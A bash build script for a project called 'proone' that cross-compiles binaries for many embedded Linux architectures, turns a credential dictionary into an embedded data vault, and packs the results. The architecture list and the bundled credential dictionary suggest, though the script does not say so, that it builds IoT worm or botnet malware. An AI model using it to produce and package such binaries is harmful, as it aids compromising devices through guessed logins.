#!/bin/bash
set -e

ARCH_ARR=(
#	"aarch64"
	"armv4t"
#	"armv7"
	"i686"
#	"x86_64"
	"m68k"
	"mips"
	"mpsl"
	"ppc"
	"sh4"
)
TOOLCHAIN_ARR=(
#	"aarch64"
	"armv4t"
#	"armv7"
	"i686"
#	"x86_64"
	"m68k"
	"mips"
	"mpsl"
	"ppc"
	"sh4"
)
HOST_ARR=(
#	"aarch64-linux"
	"arm-linux"
#	"arm-linux"
	"i686-linux"
#	"x86_64-linux"
	"m68k-linux"
	"mips-linux"
	"mipsel-linux"
	"powerpc-linux"
	"sh4-linux"
)
ARR_SIZE="${#ARCH_ARR[@]}"
if [ $ARR_SIZE -ne "${#TOOLCHAIN_ARR[@]}" ] ||
	[ $ARR_SIZE -ne "${#HOST_ARR[@]}" ];
then
	echo "Config error: arrays" >&2
	exit 2
fi

PROONE_PREFIX="builds"
PROONE_DEBUG_SYM_DIR="$PROONE_PREFIX/debug"
PROONE_EXEC_DIR="$PROONE_PREFIX/proone.bin"
PROONE_TOOLS_DIR="$PROONE_PREFIX/tools"
PROONE_MISC_BIN_DIR="$PROONE_PREFIX/misc"
PROONE_REL_DIR="$PROONE_PREFIX/proone"
export PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM_DIR/"
export PROONE_EXEC_PREFIX="$PROONE_EXEC_DIR/stripped"
export PROONE_ENTIRE_PREFIX="$PROONE_EXEC_DIR/entire"
export PROONE_ASM_PREFIX="$PROONE_EXEC_DIR/asm"
export PROONE_READELF_PREFIX="$PROONE_EXEC_DIR/readelf"
export PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN_DIR/"
PROONE_REL_PREFIX="$PROONE_REL_DIR/proone"
PROONE_CDICT="$PROONE_PREFIX/cred_dict.bin"
PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"
PROONE_TOOLS="
	proone-pack
	proone-list-arch
	proone-mkcdict
	proone-mkdvault
	proone-ipaddr-arr
"


rm -rf "$PROONE_PREFIX"
mkdir\
	"$PROONE_PREFIX"\
	"$PROONE_DEBUG_SYM_DIR"\
	"$PROONE_EXEC_DIR"\
	"$PROONE_TOOLS_DIR"\
	"$PROONE_MISC_BIN_DIR"\
	"$PROONE_REL_DIR"
set +e
make distclean
set -e

# native build for tools
./configure $PROONE_AM_CONF
make -j$(nproc) -C src $PROONE_TOOLS
for t in $PROONE_TOOLS; do
	cp -a "src/$t" "$PROONE_TOOLS_DIR"
done
cp -a "./src/run-tests.sh" "./src/testlist" "$PROONE_MISC_BIN_DIR"
make distclean

# generate dvault
"$PROONE_TOOLS_DIR/proone-mkcdict"\
	"./src/proone_conf/cred_dict.txt"\
	"$PROONE_CDICT"
"$PROONE_TOOLS_DIR/proone-mkdvault" "$PROONE_CDICT" > "$PROONE_DVAULT"
DVAULT_SIZE=$(stat -c "%s" "$PROONE_DVAULT")

# cross-compile targets
for (( i = 0; i < ARR_SIZE; i += 1 )); do
	PROONE_BIN_OS="linux"\
	PROONE_HOST="${HOST_ARR[$i]}"\
	PROONE_BIN_ARCH="${ARCH_ARR[$i]}"\
	xcomp linux-app\
		"${TOOLCHAIN_ARR[$i]}"\
		"scripts/build-arch.sh"
done

# pack
"$PROONE_TOOLS_DIR/proone-pack"\
	"$PROONE_REL_PREFIX"\
	"$PROONE_DVAULT"\
	"$PROONE_EXEC_PREFIX".*
